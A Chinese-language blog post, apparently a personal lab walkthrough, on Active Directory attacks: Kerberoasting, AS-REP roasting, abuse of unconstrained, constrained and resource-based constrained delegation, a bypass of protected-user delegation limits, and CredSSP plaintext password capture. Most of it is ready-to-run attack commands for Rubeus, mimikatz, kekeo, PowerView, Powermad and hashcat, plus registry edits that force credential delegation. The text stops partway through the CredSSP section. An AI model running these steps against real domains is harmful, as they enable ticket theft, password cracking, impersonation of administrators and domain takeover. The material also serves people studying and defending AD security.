<h2 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h2><p>Kerberoast攻击原理: 攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码</p>
<h3 id="How-to-get-SPN"><a href="#How-to-get-SPN" class="headerlink" title="How to get SPN"></a>How to get SPN</h3><p>如何得到域中的所有SPN？</p>
<p><strong>1.setspn</strong><br>很简单，只需执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -q *&#x2F;*</span><br></pre></td></tr></table></figure>
<p>即可</p>
<p><strong>2.kerberoast工具集的GetUserSpns powershell脚本</strong></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132445.png" alt="QQ截图20210217132445"></p>
<h3 id="How-to-get-HASH"><a href="#How-to-get-HASH" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p>如何得到hash？<br>有如下方法</p>
<p><strong>1.Rubeus.exe</strong></p>
<p>这个工具github上就有，但是clone下来后需要自己编译成exe.</p>
<p>然后执行 Rubeus.exe kerberoast指令即可</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132502.png" alt="QQ截图20210217132502"></p>
<p><strong>2.mimikatz</strong></p>
<p>mimikatz真的神器。<br>通过命令 kerberos::ask /target:你所指定的SPN,</p>
<p><img src="http://www.const27.com/wp-content/uploads/2020/09/image-33.png" alt="img"></p>
<p>即可通过认证的方式得到一个ST。<br>然后我们在kerberos::list里可以看到我们想要的ST</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132529.png" alt="QQ截图20210217132529"></p>
<p><strong>3.powershell</strong></p>
<p>越来越发现powershell在域渗透中的重要性了<br>输入以下指令，即可完成HASH获取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MySQL&#x2F;win7.xie.com:3306&#x2F;MySQL&quot;</span><br></pre></td></tr></table></figure>
<p>然后mimikatz导出即可</p>
<h3 id="How-to-export-hash"><a href="#How-to-export-hash" class="headerlink" title="How to export hash"></a>How to export hash</h3><p>获得了ST票据，但怎么导出？</p>
<p><strong>1.mimikatz</strong></p>
<p>导出所有票据</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132544.png" alt="QQ截图20210217132544"></p>
<p>可以发现生成了kirbi文件。这就是我们所需要的hash了</p>
<p><strong>2.Empire Powershell 框架</strong></p>
<p>github:<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p>
<p>我们通过这个框架可以导出hashcat格式的hash.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132627.png" alt="QQ截图20210217132627"></p>
<h3 id="How-to-crack-HASH"><a href="#How-to-crack-HASH" class="headerlink" title="How to crack HASH"></a>How to crack HASH</h3><p>如何破解HASH?</p>
<p><strong>1.HASHCAT</strong></p>
<p>这个工具需要让hash格式为hashcat模式才能进行破解。kribi文件不能放入hashcat进行破解.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 13110 pass.txt hash.txt</span><br></pre></td></tr></table></figure>
<p><strong>2.kerberoast中的tgsrepcrack.py</strong></p>
<p>支持kribi文件破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 tgsrepcrack.py pass.txt xxx.kribi</span><br></pre></td></tr></table></figure>
<h3 id="How-to-use-Kerberoast"><a href="#How-to-use-Kerberoast" class="headerlink" title="How to use Kerberoast"></a>How to use Kerberoast</h3><p>既然我们都把ST的加密hash都破解了，那么我们就可以随便改ST中的票据内容了..\ 这里使用的是kerberoast工具集里的kerberoast.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line">## 将票据权限改为administrator</span><br><span class="line">kerberos::ptt PENTESTLAB.kirbi  #将票据注入到内存</span><br></pre></td></tr></table></figure>
<h2 id="AS-REP-Roast"><a href="#AS-REP-Roast" class="headerlink" title="AS_REP Roast"></a>AS_REP Roast</h2><p>较Kerberoast来说，比较鸡肋。<br>它的原理是在不开启kerberos预身份验证的前提下，获得其他用户的AS_RES，并破解加密session key 的 client hash。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132642.png" alt="QQ截图20210217132642"></p>
<h3 id="How-to-get-HASH-1"><a href="#How-to-get-HASH-1" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p><strong>1.Rubeus</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></table></figure>
<p>然后就会搜索域中不需要kerberos预验证的用户，并获得ASREP。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132654.png" alt="QQ截图20210217132654"></p>
<p><strong>2.Empire框架与 ASREPRoast.ps1</strong></p>
<p>使用Empire框架下的powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line"> Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure>


<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132707.png" alt="QQ截图20210217132707">然后用 ASREPRoast.ps1 ：<a target="_blank" rel="noopener" href="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a> 获取指定用户的AS-REPhash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure>
<p>就会生成一个hash数据文件了</p>
<h3 id="How-to-crack-hash"><a href="#How-to-crack-hash" class="headerlink" title="How to crack hash"></a>How to crack hash</h3><p>将生成的HASH保存起来，并在下图处加入$23</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132743.png" alt="QQ截图20210217132743"></p>
<p>然后丢给hashcat 跑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt pass.txt</span><br></pre></td></tr></table></figure>
<p>注意这里的pass.txt是自己的明文字典…之前我还一直以为是爆破出来的结果.<br>原来是一个一个的用明文字典去爆破。</p>
<h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><h3 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h3><p>域委派是一种域内主机的行为，使某个服务可以以访问的用户的身份去访问另外一个服务。<br>为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：<br>用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。<br>发生域委派的服务一般为机器账户和服务账户。<br>域委派分为三种：非约束性委派，约束性委派，基于资源的约束性委派</p>
<h4 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h4><p>非约束性委派的原理是：用户想访问服务A，于是向KDC提交认证，KDC发现A是非约束性委派，于是会把TGT放在ST中一并给用户。然后用户用这个ST去访问服务A，服务A就相当于获得了用户的TGT，把TGT放入lsass进程，然后就可以拿着用户的TGT以用户的身份去访问所有用户权限能够访问的服务了。</p>
<p>非约束性委派的启用：</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134709.png" alt="QQ截图20210217134709"></p>
<p>为某账户启用 信任此计算机来委派任何服务 即开启非约束性委派。<br>开启后在该用户的 ACL属性会多出一个 flag : WORKSTATION_TRUSTED_FOR_DELEGATION (图截不完，反正这个flag就在箭头所指处的后面)</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134749.png" alt="QQ截图20210217134749"></p>
<p>非约束委派的设置需要<code>SeEnableDelegation</code> 特权，该特权通常仅授予域管理员<br>这里说个题外话，域控主机默认是非约束性委派</p>
<h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4><p>非约束性委派是很不安全的（因为控制了开启非约束性委派的机器，就相当于获得了上面的所有其他用户的TGT），所以更安全的约束性委派诞生了。<br>约束性委派多了两个委派协议，S4U2SELF S4U2PROXY，并且限制了被设置委派的服务的访问范围：仅能被委派到被指定的服务。</p>
<p>约束性委派的大致流程：<br>用户访问开启约束性委派的服务A<br>（情况一：无S4U2SELF参与）首先需要经过KDC认证，KDC发现服务A开启了约束性委派，于是在TGS_RES返回给用户ST1（可转发ST），用户拿着ST1访问服务A，服务A先与KDC进行身份验证获得一个有效TGT，然后拿着ST1经过S4U2PROXY协议向KDC发起TGS_REQ，KDC返回ST2（用户身份的ST），然后服务A拿着ST2访问指定服务。<br>（情况二：有S4U2SELF参与）用户通过其他方式（如NTLM认证，表单认证等）获取了服务A的信任，但是此时服务A并没有来自用户的ST1，按情况一中的流程，服务A就不能完成委派。所以这个时候服务A会以自己的身份向KDC发起申请获取一个可转发TGT（获取KDC信任），然后用这个TGT发起TGS_REQ获得指定用户的ST1，既然获取了ST1，就继续情况一中的流程即可了。</p>
<p>也就是说S4U2SELF是用户通过非kerberos协议完成认证的情况下，自动向KDC获取ST1的一个协议。<br>而S4U2PROXY则是将ST1发给KDC，使其变现为成自己可用的 ST2 的一个协议。</p>
<p>启用方法:</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135048.png" alt="QQ截图20210217135048"></p>
<p>其中被添加的服务则是允许被委派到的服务</p>
<p>若启用的是 仅使用kerberos，那么useraccountcontrol属性仅有 workstation_trust_account.<br>若启用任何身份验证协议，就会有 TrustedToAuthenticationForDelegation</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135100.png" alt="QQ截图20210217135100"></p>
<h4 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h4><p>Windows Server 2012中引入了基于资源的约束性委派。 只能在运行Windows Server 2012或Windows Server 2012 R2及以上的域控制器上配置<br>基于资源的约束性委派，不需要域管理员前来设置，而把设置委派的权限交给了自身。<br>其实就是可以摆脱域控来主动设置自己可以被哪些账户委派访问。</p>
<h3 id="非约束性委派攻击"><a href="#非约束性委派攻击" class="headerlink" title="非约束性委派攻击"></a>非约束性委派攻击</h3><p>非约束性委派有巨大的安全问题，上面我们说过，非约束性委派的实质就是把用户的TGT存入lassa进程，从而模拟用户身份进行各种委派访问，所以我们只需控制非约束性委派攻击的机器，然后dump出所有的票据，就相当于获得了所有经过该服务进行约束性委派的用户的身份了。</p>
<h4 id="1-进行非约束性委派账户扫描"><a href="#1-进行非约束性委派账户扫描" class="headerlink" title="1.进行非约束性委派账户扫描"></a>1.进行非约束性委派账户扫描</h4><p>这里提一下怎么创建有SPN的服务账户。<br>只需再域控里执行 setspn -U -A spn_type username 即可<br>其中spn_type即SPN的格式： MSSQLSvc/<FQDN>:[<port> | <instancename>]</p>
<ul>
<li><strong>MSSQLSvc</strong> 是要注册的服务。</li>
<li><FQDN> 是服务器的完全限定域名。</li>
<li><port> 是 TCP 端口号。</li>
<li><instancename> 是 SQL Server 实例的名称。</li>
</ul>
<p>这里我们随便输一个，比如 sb/caonima 这种都行.</p>
<p>这里采用powersploit下的powerview.ps1<br>根据我网上很多搜索结果，查找非约束委派服务账户只需调用<br><code>Get-NetUser -Unconstrained -Domain de1ay.com</code><br>这个命令即可，但是我下载下来的powerview里的get-netuser里却没有unconstrained参数，很烦。所以用一个比较原始的方法来判别（适合在用户少的情况下）<br>直接调用 Get-NetUser -SPN 找到所有服务账户或者Get-domaincomputer找到所有机器账户，然后判断其useraccountcontrl里有没有trusted_for_delegation,若有，则说明开启了非约束性委派</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135123.png" alt="QQ截图20210217135123"></p>
<p>查询非约束委派机器账户则用<br><code>Get-domaincomputer -unconstrained -domain const.com</code></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135236.png" alt="QQ截图20210217135236"></p>
<h4 id="2-非约束性委派的攻击"><a href="#2-非约束性委派的攻击" class="headerlink" title="2.非约束性委派的攻击"></a>2.非约束性委派的攻击</h4><p>仅能基于机器账户</p>
<p>如果我们获得了一个非约束性委派账户，我们就可以通过收集内存中的tgt达到任意用户访问的目的。</p>
<p>在被控制的非约束性委派机器上使用mimikatz。<br><code>privilege::debug</code>提权<br><code>sekurlsa::tickets</code> 查看本机所有票据</p>
<p>通过以上命令获取票据,如果管理员访问了本机的一些服务，那么它的TGT就会被截获放入内存。</p>
<p>我们模拟管理员调用非约束性委派机的smb服务</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135342.png" alt="QQ截图20210217135342"></p>
<p>我们回到非约束委派机，查看票据</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135358.png" alt="QQ截图20210217135358"></p>
<p>tgt被截获,我们用 sekurlas::tickets /export 把票据导出来</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135408.png" alt="QQ截图20210217135408"></p>
<p>然后mimikatz里使用<br><code>kerberos::ptt 票据文件名 将票据注入内存</code><br>访问域控c$</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135419.png" alt="QQ截图20210217135419"></p>
<p>成功</p>
<h4 id="3-非约束性委派配合-Spooler打印机服务"><a href="#3-非约束性委派配合-Spooler打印机服务" class="headerlink" title="3.非约束性委派配合 Spooler打印机服务"></a>3.非约束性委派配合 Spooler打印机服务</h4><p>纯非约束性委派攻击很鸡肋，因为必须要其他用户通过你进行委派访问。<br>但是 ：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。 配合非约束性委派攻击，简直爆炸，可以主动拿到其他用户的TGT。-<br>而且splooer服务是默认运行的。（图源WIN7）</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135445.png" alt="QQ截图20210217135445"></p>
<p>使其他主机强行与自己发生身份验证的脚本：需要自己编译一下<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample.git">https://github.com/leechristensen/SpoolSample.git</a></p>
<p>在此之前需要开启监听来自其他主机的TGT，这里用的是rubeus<br><code>Rubeus.exe monitor /interval:1 /filteruser:xx</code></p>
<p>然后使用<code>SpoolSample.exe XX win7</code>,让指定机器访问WIN7进行身份验证</p>
<p>然后获得TGT，下班。</p>
<h3 id="约束性委派的攻击"><a href="#约束性委派的攻击" class="headerlink" title="约束性委派的攻击"></a>约束性委派的攻击</h3><p>约束性委派的大致攻击流程是: (利用S4U2SELF=&gt;)如果我们获得了约束性委派机的NTLM hash或者明文密码，我们就可以以此来向KDC发送一个TGT申请，获得一个可转发的TGT。然后用这个可转发的TGT调用S4U2SELF协议，获得一个针对自己的ST1票据（其中ST1票据中的请求用户可以任意伪造）.然后用这个ST1票据去向KDC请求ST2，然后用ST2去访问服务，此时我们访问的身份就是我们任意伪造的身份了.</p>
<p>重点是只要获得了可转发TGT，约束性委派机就可以任意伪造其他用户的ST1票据请求，太可怕了。</p>
<p>这个攻击的最大前提是我们得获得约束性委派账户的NTLM HASH或者明文密码,然后我们才能成功的得到可转发TGT，然后才能得到接下来的一切。</p>
<p>首先配置好约束性委派账户</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135527.png" alt="QQ截图20210217135527"></p>
<p>注意选用 使用任何身份验证协议</p>
<p>我们先信息搜集：看哪些用户是开启约束性委派的。一手powerview安排上</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135553.png" alt="QQ截图20210217135553"></p>
<p>箭头指出的地方就是可以被委派访问的服务</p>
<p>我们用kekeo来实现攻击.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgt::ask &#x2F;user:xx &#x2F;domain:xx &#x2F;password:xx &#x2F;ticket:test.kirbi这里的&#x2F;password可以改成&#x2F;NTLM:xx</span><br><span class="line">获得TGT转发票据</span><br><span class="line"></span><br><span class="line">tgs::s4u &#x2F;tgt:file_name &#x2F;user:administrator &#x2F;service:cifs&#x2F;DC</span><br><span class="line">tgt处改为刚刚得到的TGT文件的名字，这个命令执行后得到administrator身份的 ST2</span><br></pre></td></tr></table></figure>
<p>把最后获得的票据用mimikatz kerberos::ptt 注入内存，完事。</p>
<h3 id="基于资源的约束性委派-1"><a href="#基于资源的约束性委派-1" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>refer:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p>
<h4 id="原理的几个点："><a href="#原理的几个点：" class="headerlink" title="原理的几个点："></a>原理的几个点：</h4><p>1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的ST是不可被转发的。<br>2.基于资源的约束性委派主机 在被另一台主机委派访问时，在S4U2PROXY过程中提交过来的ST如果即使是不可转发的。KDC依旧会返回有效的ST2。<br>3.每个普通域用户默认可以创建至多十个机器账户（ 由MachineAccountQuota属性决定 ），每个机器账户被创建时都会自动注册SPN: <code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN</p>
<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h4><p>假设开启基于资源的约束性委派机器为A<br>1.首先要有一个对当前计算机有写权限的账户，才能对A设置可以 被 委派访问的服务账户。<br>2.利用当前账户创建一个机器账户，并配置好机器账户到A的 基于资源的约束性委派<br>3.因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用S4U2SELF协议获得一个不可转发ST。然后用这个不可转发ST通过S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问A cifs服务的ST2。<br>4.用ST2访问A的CIFS服务，权限获得。</p>
<h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>这个攻击说白了就是个提权…</p>
<p>首先我们检查一下域控是否是win2012以上的主机，因为只有这样才能开启 基于资源的约束性委派。</p>
<p>我们使用powersploit下的powerview脚本。执行命令 get-netdomaincontroller</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135833.png" alt="QQ截图20210217135833"></p>
<p>可以获得域控WIN版本</p>
<p>然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。<br>直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135859.png" alt="QQ截图20210217135859"></p>
<p>我们依旧使用powerview。先调用<br><code>Get-DomainUser -Identity username -Properties objectsid</code>来获取当前用户SID<br>然后<code>Get-DomainObjectAcl -Identity 主机名 | ?&#123;$_.SecurityIdentifier -match &quot;刚刚得到的SID&quot;&#125;</code> 查看当前用户对某台主机是否有写权限。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140628.png" alt="QQ截图20210217140628"></p>
<p>如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。<br>如图看到我们对WIN7进行操作</p>
<p>好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用powermad这个ps脚本可以很快捷的创建一个机器用户。<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140659.png" alt="QQ截图20210217140659"></p>
<p>好的，我们添加了一个密码hack，名为hacksystem的机器账户，接下来就是配置hacksystem到WIN7的委派了。我们需要做的，是修改WIN7的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值 ，这个操作我们用powerview实现。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  </span><br><span class="line">#这儿的sid是我们创建的#机器用户#evilsystem的sid</span><br><span class="line">$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140726.png" alt="QQ截图20210217140726"></p>
<p>至于机器账户SID怎么获得，powerview下的 <code>get-domiancomputer hacksystem</code><br>然后使用<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> 查看委派是否设置成功</p>
<p><code>Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose </code>此命令可以清除 msds-allowedtoactonbehalfofotheridentity属性的值</p>
<p>现在都统统设置好了，开始下一步吧。<br>网上一般用的rubeus，这里我用kekeo吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx</span><br></pre></td></tr></table></figure>
<p>本地运算出机器用户ntlm hash 这里借用一下别人的图</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140944.png" alt="QQ截图20210217140944"></p>
<p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> 写入票据</p>
<p>然后我在本机使用以上方法后klist一下，发现确实存在票据</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140737.png" alt="QQ截图20210217140737"></p>
<p>但是dir \test1\c$时本机莫名其妙不能进行kerberos验证，我服了》。。但不管怎样，我们拿到银票了</p>
<h4 id="敏感用户不可委派的绕过"><a href="#敏感用户不可委派的绕过" class="headerlink" title="敏感用户不可委派的绕过"></a>敏感用户不可委派的绕过</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141050.png" alt="QQ截图20210217141050"></p>
<p>若我们的administrator用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。</p>
<p>我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>继续实验administrator，发现确实是这样</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141131.png" alt="QQ截图20210217141131"></p>
<p>此时我们用 rubeus.exe describe /ticker:S4Ubase64加密的票据</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141313.png" alt="QQ截图20210217141313"></p>
<p>可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具<br><a target="_blank" rel="noopener" href="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a><br>但实际上rubeus也能完成票据修改<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141325.png" alt="QQ截图20210217141325"></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141339.png" alt="QQ截图20210217141339"></p>
<p>完事</p>
<h2 id="credssp-导出用户明文密码"><a href="#credssp-导出用户明文密码" class="headerlink" title="credssp 导出用户明文密码"></a>credssp 导出用户明文密码</h2><p>CredSSP协议的目的是将用户的明文密码从CredSSP客户端委派给CredSSP服务器。 通常运用于远程桌面服务。</p>
<p>我们在配置这个协议时，一般在组策略编辑器里配置。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143231.png" alt="QQ截图20210217143231"></p>
<p>Allow delegating default credentials表示在通过使用受信任的X509证书或Kerberos实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p>
<p>Allow delegating default credentials with NTLM-only server authentication表示在通过NTLM实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p>
<p>这几个属性在注册表里对应 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation。</p>
<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>那么这样看，这个攻击流程就很自然了。<br>我们要获得两台机器，一台机器当作远程桌面的服务器，一台当作远程桌面的客户端。<br>在客户端上配置组策略（CREDSSP），使其在远程桌面身份验证时发送明文密码。<br>然后开始远程桌面验证，在服务器上获得客户端发来的明文密码.</p>
<h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p>1.通过修改注册表，改变组策略身份验证的凭据策略(选一个），这一步需要管理员权限，本地或域管</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefaultCredentials &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefCredentialsWhenNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefault &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br></pre></td></tr></table></figure>
<p>一股脑设置好就完事了。。（用户需重新登陆才生效）</p>
<p>然后开始获取密码</p>
<p>我们刚刚提到需要两台电脑才能获取密码，其实那只是一个模型，一个机器既可以当作客户端又可以当作服务端的。<br>我们用kekeo实现攻击（本机向本机获取密码时，普通用户即可完成以下操作）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tsssp::server 开启服务端</span><br><span class="line">tsssp::client &#x2F;target:...   开启客户端，这里的target随便填</span><br></pre></td></tr></table></figure>
